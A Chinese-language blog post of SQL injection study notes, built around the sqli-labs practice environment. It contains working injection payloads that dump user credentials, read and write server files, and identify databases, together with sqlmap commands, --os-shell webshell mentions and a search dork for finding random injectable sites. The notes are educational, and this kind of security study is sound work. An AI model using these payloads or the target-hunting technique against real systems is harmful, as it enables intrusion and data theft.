---
layout: post
title: "SQL注入学习"
date: 2018-06-11
category: web安全
tags: web安全 sql注入 web安全进阶笔记
---

# web安全进阶笔记01
# SQL注入漏洞原理与利用

## Web应用框架分析
### 01 WEB框架
webapp->  
	web前端  
	web应用CMS／OA／Blog  
	Web开发框架：Django／Struts2/ThinkPHP  
	Web语言：PHP/JSP/.Net  

---

容器->  
	IIS、Apach、TomCat、Nginx


### 02 理解SQL注入
所有SQL语句 都有可能SQL注入  

---
---
---

## SQL注入练习环境搭建
Sqli-labs  
https://github.com/Audi-1/sqli-labs  
+ 报错注入  
+ 盲注
+ Update注入
+ Insert注入
+ Header注入
+ 二阶注入
+ 绕过WADF

1. PHP+MySql+Apache  
WAMP  
windows  

+ 下载安装WAMP http://www.wampserver.com/en/
+ WAMP的www目录下 解压缩sqli-labs
+ 启动服务器
+ 配置数据库（root）phpMyadamin 
+ 修改配置 sqli-labs/sql-connections/db-creds.inc
+ http://localhost/sqli-labs  点击 setup/reset database for labs

2. Docker
+ docker search sqli-labs
+ docker pull acgplano/sqli-labs
+ docker images
+ docker run -dt \-\-name sqli -p 80:80 \-\-rm acgplano/sqli-labs  (-dt 后台运行 --name 命名 -p 端口名  80:80 本地：docker \-\-rm 当停止后删除产生镜像)


### tips
对应代码，边看代码边理解，学会一半，就基本没问题。  

---
---
---

## SQL注入原理

### SQL注入背景介绍-SQL语言介绍
sql 结构化查询语言  
通用的功能极强的关系数据库标准语言  
功能包括查询、操纵、定义和控制四个方面  
不需要告诉SQL如何访问数据库，只要告诉SQL需要数据库做什么 

### SQL注入产生原因
网络技术与信息技术高速发展，B/S模式具有界面统一，使用简单，易于维护，扩展性好，共享度高等优点，B/S模式越来越多的被应用于程序编写中。  

1. B/S建立在互联网，对安全控制能力较弱
2. 开发人员水平和经验参差不齐，没有在编写代码时对用户的输入数据或者页面携带信息进行必要的合法性判断。  

攻击者利用这个机会**提交一段数据库查询代码**，根据程序返回的结果，就可以获得一些数据库信息。

### SQL注入核心原理

SQL注入是一种将恶意的SQL代码**插入或添加到应用（用户）的输入参数**的攻击，攻击者探测出开发者编程过程中的漏洞，利用这些漏洞，巧妙的**构造SQL语句**对数据库系统的内容进行直接**检索或修改**。


灵活的SQL查询语句+用户输入的数据带入了SQL语句=用户直接操作数据库->**SQL注入漏洞**

	select version();
	select id from where id=1;
	select id from jobs where id=1 union select version();

	select id.location from jobs where id=1 union select 1,version();  // 1是占位

用户输入可控，代码对用户输入进行了拼接，带入SQL语句，产生SQL注入漏洞

http://test.com/index.php?id=1*UNION SELECT 1,version()#*


	$id=$_GET['id'];// id没做处理
	$sql="SELECT * FROM users WHEre id='$id' LIMIT 0,1"

	select id,location from jobs where id=1 union select 1,version()#


<br/>

	docker ps --help
	docker ps -a
	docker exec -it <id> /bin/bash
	mysql
	show databases;
	use security;
	show tables;

	select * from users;
	select username from users where id=1;
	select username,password from users where id=1;

	select 1;
	select 1123;
	select version();
	select username,password from users where id=1 union select version();
	select username,password from users where id=1 union select 1,version();

	select * from users where id=1 limit 0,1;
	select * from users where id=-1 union select 1,2,version()# limit 0,1;

	// 浏览器
	http://127.0.0.1:90/Less-1/?id=1%27%20union%20select%201,2,3%23
	?id=1' union select 1,2,3
	// %23 #

	http://127.0.0.1:90/Less-1/?id=-1%27%20union%20select%201,version(),3%23
	?id=-1' union select 1,version(),3
	// 需要让它出个错

	// 控制台
	// 退出mysql
	exit

	cd /var/www/html/Less-1
	cat index.php
	vi index.php
	// 编辑
	echo $sql
	:wq


todo sqli-labs源码地址

	docker ps -a
	docker exec -it <id> /bin/bash
	cd /var/www/html/Less-1

---



---
---
---
## MySql常用函数及逻辑运算
### 01 常用的函数
MySql内置函数：  
https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.html  

MySql注入常用函数

	函数名称 函数功能
	system_user() 系统用户名
	user() 用户名
	current_user() 当前用户名
	session_user() 连接数据库的用户名
	database() 数据库名
	version() @@version 数据库版本
	@@datadir 数据库路径
	@@basedir 数据库安装路径
	@@version_compile_os 操作系统
	count() 返回执行结果数量
	concat() 没有分隔符地连接字符串
	concat_ws() 含有分隔符地连接字符串
	group_concat() 连接一个组的所有字符串，并以逗号分隔每一条数据
	load_file() 读取本地文件
	into outfile 写文件
	ascii() 字符串的ASCII代码值
	ord() 返回字符串第一个字符的ASCII值
	mid() 返回一个字符串的一部分
	substr() 返回一个字符串的一部分
	length() 返回字符串的长度

	left() 返回字符串的最左面几个字符
	floor() 返回小于或等于x的最大整数
	rand() 返回0和1之间的一个随机数
	extractvalue() 
	第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
	第二个参数：XPath_string（Xpath格式的字符串）
	作用：从目标XML中返回包含所查询值的字符串
	updatexml()
	第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
	第二个参数：XPath_string（Xpath格式的字符串）
	第三个参数：new_value，String格式，替换查找到的符号条件的数据
	作用：改变文档中符合条件的节点的值
	sleep() 让此语句运行N秒钟
	if() 
	>  SELECT IF(1>2,2,3);
	-> 3
	char()
	返回整数ASCII代码字符组成的字符串
	STRCMP() 比较字符串内容
	IFNULL() 假如参数1不为NULL，则返回值为参数1，否则其返回值为参数2
	exp() 返回e的x次方

---

	运行
	select system_user(); 
	select user();
	select current_user();
	select session_user();

	select show databases;
	use security
	select database();

	select version();
	select @@version;
	select @@datadir;
	select @@basedir;
	select @@version_compile_os;
	select count(*) from users;
	select count(1) from users;

	select concat(username,password) from users;
	select concat_ws(',',username,password) from users;
	select concat_ws(0x7e,username,password) from users;//~
	select gruop_concat(username) from users;

	select 'mysql' into outfile '/tmp/mysql';
	select load_file('/tmp/mysql');

	select ascii('a');
	select ord('adkfjk'); // 字符串第一个字符的ascii
	select mid('bdkfjk',1,1); // b 从第一位开始取第一个字符
	select mid('bdkfjk',1,1); // bd
	select substr('bdkfjk',1,2); //bd
	select substr('bdkfjk',1,4); //bdkf

	select length('dfdf'); // 4

	select left('dfdfdf',2) // df
	select floor(2.4); // 2
	select floor(5.6); // 5

	select rand(); // 0~1之间随机数

	select sleep(2); 

	select if(1<2,2,3);

	char(97);

	select strcmp('a','b'); // -1 对比两个值
	select strcmp('a','a'); // 0

	select ifnull(null,1);
	select ifnull(2,1);

	select exp(2); // 自然对数e 的几次方

XPath  
http://www.w3school.com.cn/xpath/  



#### MySql运算符
算术运算符：  

* \+ 加法运算
* - 减法运算
* \* 乘法运算
* ／ 除法运算
* % 求余运算
* DIV 除法运算，同”／“
* MOD 求余运算，同”%“

比较运算符：
  
* \> 大于
* < 小于
* = 等于
* \>= 大于等于
* <= 小于等于
* != 或 <> 不等于
* IS NULL 为空
* IS NOT NULL 不为空
* BETWEEN AND 在..之间
* IN 包含
* NOT IN 不包含
* LIKE 模式匹配
* NOT LIKE 模式匹配
* REGEXP 正则表达式

逻辑运算符：  

* && 或 AND 与
* \|\| 或 OR 或
* ! 或 NOT 非
* XOR 异或


---

	select 1+2;
	
	select id,username from users where id between 1 and 4;
	
	select id,username from users where username in ('admin','tesdt');
	
	select id,username from users where username not in ('admin','tesdt');
	
	select id,username from users where username like 'admin';
	
	select id,username from users where username like '%ad%';
	
	select user() regexp 'root';
	
		
	
### 02 逻辑运算
#### 逻辑运算符： AND <--> OR

	select * from users where id=1; // true
	select * from users where id=1 and 1=1; // true
	select * from users where id=1 and 1=2; // false 返回 empty
	
	select * from users where id=1 or 1=2; // true 
	
	
---

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/01.jpeg)

	登录处的SQL语句：
	select * from users where username='admin' and pwd='pass';
	'or '1' = '1
	select * from users where username=''or '1'='1' and pwd=''or '1' = '1';
	

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/02.jpeg)

	and 1=2 union select 1,2,3-- // 1=2 false 执行union后面的语句
	select user() regexp '^ro' // ro开头的用户
	ascii(substr(select user()),1,1)=114 // 用户名为r的用户
	if(ascii(substr((select user(),1,1))=114,0,sleep(5))) // 如果用户名第一个字母是r就返回0，否则睡5秒
	(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=9) 
	updatexml(1,concat(0x7e,(select @@version),0x7e),1) // 报错信息打印版本
	
	
---

	http://127.0.0.1/Less-1/?id=1 and 1=2 union select 1,2,3--+
	http://127.0.0.1/Less-1/?id=1 and 1=2 union select 1,user(),3--+
	
	
---
---
---

### SQL注入流程
#### 01 寻找SQL注入点
##### 寻找SQL注入点

无特定目标：  
inurl:.php?id=  

有特定目标：  
inurl:.php?id=site:target.com 
// jsp sid   

工具爬取：  
spider,对搜索引擎和目标网站的链接进行爬取  

**注入识别**
手工简单识别：  
	
	'
	and 1=1 / and 1=2
	and '1'='1 / and '1'='2 
	and 1 like 1 / and 1 like 2

工具识别：  
	
	sqlmap -m filename (filename中保存检测目标)
	sqlmap --crawl(sqlmap对目标网站进行爬取，然后依次进行测试)
 
**高级识别：**  
扩展识别广度和深度：  
	
	SqlMap --level 增加测试级别，对header中相关参数也进行测试
	sqlmap -r filename (filename中为网站请求数据)

利用工具提高识别效率：
	
	BurpSuite + SqlMap
	BurpSuite拦截所有浏览器访问提交的数据
	BurpSuite扩展插件，直接调用SqlMap进行测试

一些Tips：  

可以在参数后键入“*” 来确定想要测试的参数  
可能出现注入的点：新闻、登录、搜索、留言... ...  
站在开发的角度去寻找  


---
	
	python sqlmap.py -r 1.txt

burp sqlmap 扩展  
Burp-> Extender->BApp Store -> SQLiPy Sqlmap  

**代码审计：**

搜索关键代码和函数  
梳理业务流程  

强网杯WEB “python is the best language”  

	http://test.com/register  
	POST:  

	username=test&email=t@t.com&password=123&password2=123&submit=Register  
	username=test&email=t@t.com' and '1' = '1&password=123&password2=123&submit=Register  



#### 02 SQL注入流程

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/01.png)

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/02.png)

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/03.png)

数据获取
	
	web.mdb
	
	select [*] from admin
	select [*] from system
	
	select [username] from system
	select [name] from system


![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/04.png)

提权
	
	xp.cmdshell
	
	--os-shell // 执行系统命令 写webshell到网站目录
	

---
---
---
## MySQL手工注入
### 01 MySQL数据库结构

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/01.png)
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/02.png)
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/03.jpg)
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/04.png)

核心原理：  
MySql内置的infromation_schema库，它功能强大，是我们进行MySql注入的基石！  
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/05.png)

	select schema_name from information_schema.schemata // 查库
	select table_name from information_schema.tables where table_schema=库名 // 查表
	select column_name from information_schema.columns where table_name=表名 // 查列
	select 列名 from 库名.表名 // 查数据
	
	
	select column_name from information_schema.columns where table_name=0x7573657273;
	
	
	![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/06.png)
	
	select group_concat(schema_name) from information_schema.schemata;
	select username,password from security.users limit 0,1;
	
---

### 02 MySQL手工注入方法

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/03/07.jpg)

	http://127.0.0.1/Less-1/?id=2
	http://127.0.0.1/Less-1/?id=2' 注入点
	http://127.0.0.1/Less-1/?id=2' and '1'='1 正常
	http://127.0.0.1/Less-1/?id=2' and '1'='2 报错
	
	http://127.0.0.1/Less-1/?id=2' order by 3--+ 判断字段长度
	http://127.0.0.1/Less-1/?id=2' order by 4--+ 返回错误
	
	http://127.0.0.1/Less-1/?id=2' union select 1,2,3--+
	http://127.0.0.1/Less-1/?id=-1' union select 1,2,3--+ 判断数据显示位置
	
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+ 提示more than 1 row 查询库名
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select group_concat(table_name) from information_schema.table where table_schema=database())--+ 当前库
	
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select concat_ws('~',username,password) from security.users limit 0,1)--+
	
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select concat_ws(0x7e,username,password) from security.users limit 0,1)--+
	
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select group_concat(username,0x7e,password) from security.users)--+
	
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select database())--+
	
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select load_file('/var/www/html/sql-connections/db-creds.inc'))--+ 读文件
	
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select 'test' into outfile '/var/www/html/sql-connections/t.txt')--+ 写文件
	
	http://127.0.0.1/Less-1/?id=' union select 1,2,(select 'test' into outfile '/tmp/t.txt')--+ 写文件
	
	
	



http://127.0.0.1:90/Less-1/




























	


